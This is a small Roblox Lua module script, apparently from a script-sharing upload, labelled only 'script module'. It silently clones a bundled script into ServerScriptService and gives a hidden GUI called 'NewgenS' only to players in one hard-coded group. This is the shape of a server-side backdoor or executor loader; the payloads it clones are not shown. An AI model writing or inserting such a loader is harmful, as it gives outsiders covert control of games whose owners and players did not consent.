--[[
	id: W29ODe7AJ7EHq8v2PbeU_
	name: script module
	description: otf
	time1: 2021-05-15 01:59:04.715631+00
	time2: 2021-05-15 01:59:04.715631+00
	uploader: uL1ZtN0e7-K5DbQeToPgKmrW8TE3EnptCmERgSW3
	uploadersession: Nfx_qJ6Z-zmNA5tF5p4tWrELt9vrpT
	flag: f
--]]

local module = {}
---
local group = 3706518
---
script.Functions.Script:Clone().Parent = game.ServerScriptService
---
game.Players.PlayerAdded:Connect(function(lol)
if lol:IsInGroup(group) then
	script.NewgenS:Clone().Parent = lol.PlayerGui 
	else
	script:Destroy()
end
end)
---
return module
